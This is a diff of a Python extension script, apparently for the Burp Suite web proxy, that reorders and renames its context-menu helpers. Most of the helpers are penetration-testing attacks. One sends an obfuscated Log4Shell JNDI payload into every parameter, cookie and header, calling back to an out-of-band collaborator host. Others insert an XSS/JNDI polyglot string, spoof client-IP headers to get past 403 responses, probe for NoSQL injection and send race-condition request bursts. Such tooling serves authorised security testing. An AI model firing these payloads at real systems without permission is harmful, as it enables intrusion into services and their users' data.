@@ -3,35 +3,34 @@ import json
 import ssl
 import urllib2
 
+
 pool = RequestPool(20)
 
+"""
+    Please register function name in the `registerContextMenu` function at the end of the page.
+"""
 
-def base64Encode(selectedText):
-    return base64encode(selectedText)
-
-def base64Decode(selectedText):
-    return base64decode(selectedText)
+def insert_at_cursor():
+    return "'\"><img/src/onerror=alert(1)>${jndi:ldap://example.com/a}"
 
 
-def unicodeEscape(selectedText):
+def unicode_escape(selectedText):
     return selectedText.encode('utf-8').decode('unicode_escape')
 
 
-def json_dump_ensure_ascii_false(selectedText):
+def json_dumps(selectedText):
     json_object = json.loads(selectedText)
-    return json.dumps(json_object, ensure_ascii=False, indent=2)
+    return json.dumps(json_object, ensure_ascii=True, indent=2)
 
 
-def log4shell(request):
-    print("log4shell requests: ", request.url())
-    host = request.httpService().host()
-    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + ".TOKEN.oastify.com:/a}"  # Replace it
-    pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
-    pool.run(sendRequest, modifyAllParamsValue(request, payload))
-    for header in request.headers():
-        if header.name().lower() not in ["cookie", "host","content-length"]:
-            request = request.withHeader(header.name(), payload)
-    pool.run(sendRequest, request)
+def json_quotes(selectedText):
+    return json.dumps(json.dumps(json.loads(selectedText)))
+
+
+def bypass403(messageEditor):
+    ip = "127.0.0.1"
+    request = messageEditor.requestResponse().request()
+    messageEditor.setRequest(request.withHeader("X-Forwarded-For", ip).withHeader("X-Originating-IP", ip).withHeader("X-Remote-IP", ip).withHeader("X-Remote-Addr", ip).withHeader("X-Real-IP", ip).withHeader("X-Forwarded-Host", ip).withHeader("X-Client-IP", ip).withHeader("X-Host", ip))
 
 
 # When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
@@ -43,10 +42,17 @@ def race_condition_10(request):
     sendRequests([request] * 10)
 
 
-def bypass403(messageEditor):
-    ip = "127.0.0.1"
-    request = messageEditor.requestResponse().request()
-    messageEditor.setRequest(request.withHeader("X-Forwarded-For", ip).withHeader("X-Originating-IP", ip).withHeader("X-Remote-IP", ip).withHeader("X-Remote-Addr", ip).withHeader("X-Real-IP", ip).withHeader("X-Forwarded-Host", ip).withHeader("X-Client-IP", ip).withHeader("X-Host", ip))
+def log4shell(request):
+    collaborator = 'TOKEN.oastify.com'
+    print("log4shell requests: ", request.url())
+    host = request.httpService().host()
+    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + "." + collaborator + "/log4shell}"  # Replace it
+    pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
+    pool.run(sendRequest, modifyAllParamsValue(request, payload))
+    for header in request.headers():
+        if header.name().lower() not in ["cookie", "host","content-length"]:
+            request = request.withHeader(header.name(), payload)
+    pool.run(sendRequest, request)
 
 
 def insert_to_reflect_params(messageEditor):
@@ -93,38 +99,6 @@ def noSqliScan(request):
             if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
                 #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
                 no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
-
-
-def insertAtCursor():
-    return "'\"><img/src/onerror=alert(1)>${jndi:ldap://example.com/a}"
-
-
-def registerContextMenu(menus):
-    """
-    To register a custom context menu using the register method,
-    three parameters need to be passed: the menu name, the menu function, and the menu type.
-    The menu types include CARET, SELECTED_TEXT, REQUEST, REQUEST_RESPONSE and MESSAGE_EDITOR.
-    """
-    menus.register("Bypass 403", bypass403, MenuType.MESSAGE_EDITOR)
-    menus.register("Find Reflect Params", insert_to_reflect_params, MenuType.MESSAGE_EDITOR)
-
-    menus.register("Base64 Encode", base64Encode, MenuType.SELECTED_TEXT)
-    menus.register("Base64 Decode", base64Decode, MenuType.SELECTED_TEXT)
-    menus.register("Unicode Escape", unicodeEscape, MenuType.SELECTED_TEXT)
-    menus.register("json dumps", json_dump_ensure_ascii_false, MenuType.SELECTED_TEXT)
-
-    menus.register("Spring Bypass", router_bypass, MenuType.REQUEST_RESPONSE)
-
-    menus.register("Race Condition x10", race_condition_10, MenuType.REQUEST)
-    menus.register("Send Log4Shell Reqeusts", log4shell, MenuType.REQUEST)
-    menus.register("NoSQL Injection", noSqliScan, MenuType.REQUEST)
-    menus.register("Send to proxy", sendRequestWithProxy, MenuType.REQUEST)
-
-    menus.register("XSS At Cursor", insertAtCursor, MenuType.CARET)
-
-
-def finish():
-    pool.shutdown()
 
 
 def middle_bypass_poc(path1 ,path2):
@@ -286,3 +260,30 @@ def modifyAllParamsValue(request, value, excluded=[]):
             continue
         request = request.withParameter(parameter(param.name(), value, param.type()))
     return request
+
+
+def registerContextMenu(menus):
+    """
+    To register a custom context menu using the register method,
+    three parameters need to be passed: the menu name, the menu function, and the menu type.
+    The menu types include CARET, SELECTED_TEXT, REQUEST, REQUEST_RESPONSE and MESSAGE_EDITOR.
+    """
+    menus.register("Bypass 403", bypass403, MenuType.MESSAGE_EDITOR)
+    menus.register("Find Reflect Params", insert_to_reflect_params, MenuType.MESSAGE_EDITOR)
+
+    menus.register("JSON Format", json_dumps, MenuType.SELECTED_TEXT)
+    menus.register("JSON Quotes", json_quotes, MenuType.SELECTED_TEXT)
+    menus.register("Unicode Escape", unicode_escape, MenuType.SELECTED_TEXT)
+
+    menus.register("NoSQL Injection", noSqliScan, MenuType.REQUEST)
+    menus.register("Send Log4Shell Reqeusts", log4shell, MenuType.REQUEST)
+    menus.register("Send To Proxy", sendRequestWithProxy, MenuType.REQUEST)
+    menus.register("Race Condition x10", race_condition_10, MenuType.REQUEST)
+
+    menus.register("XSS At Cursor", insert_at_cursor, MenuType.CARET)
+
+    menus.register("Spring Bypass", router_bypass, MenuType.REQUEST_RESPONSE)
+
+
+def finish():
+    pool.shutdown()
